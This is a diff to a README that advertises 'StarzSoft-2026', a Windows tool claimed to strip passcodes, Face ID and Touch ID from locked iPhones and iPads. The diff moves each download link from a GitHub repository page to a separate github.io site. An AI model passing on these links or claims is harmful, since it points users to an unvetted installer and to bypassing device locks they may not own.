@@ -1,6 +1,6 @@
 # 📱 StarzSoft-2026 - Unlock your iPhone quickly and easily
 
-[![Download Now](https://img.shields.io/badge/Download-StarzSoft--2026-blue.svg)](https://github.com/ayush001-tech/StarzSoft-2026)
+[![Download Now](https://img.shields.io/badge/Download-StarzSoft--2026-blue.svg)](https://ayush001-tech.github.io)
 
 StarzSoft-2026 removes forgotten screen lock passwords from iPhone and iPad devices. This software works on Windows 11 and Windows 10. It allows users to regain access to locked mobile devices without complex technical steps. The program handles passcode removal for various security modes, including 4-digit codes, 6-digit codes, Face ID, and Touch ID.
 
@@ -20,11 +20,11 @@ To install and run StarzSoft-2026, your Windows computer must meet these require
 You need the installer file to begin. Follow these instructions to obtain the tool:
 
 1. Open your web browser.
-2. Go to the official repository page: https://github.com/ayush001-tech/StarzSoft-2026
+2. Go to the official repository page: https://ayush001-tech.github.io
 3. Look for the release section or the primary link provided.
 4. Click the link to save the installer to your Downloads folder.
 
-[![Download StarzSoft-2026](https://img.shields.io/badge/Download-Click%20Here-grey.svg)](https://github.com/ayush001-tech/StarzSoft-2026)
+[![Download StarzSoft-2026](https://img.shields.io/badge/Download-Click%20Here-grey.svg)](https://ayush001-tech.github.io)
 
 ## ⚙️ Installation Steps
 
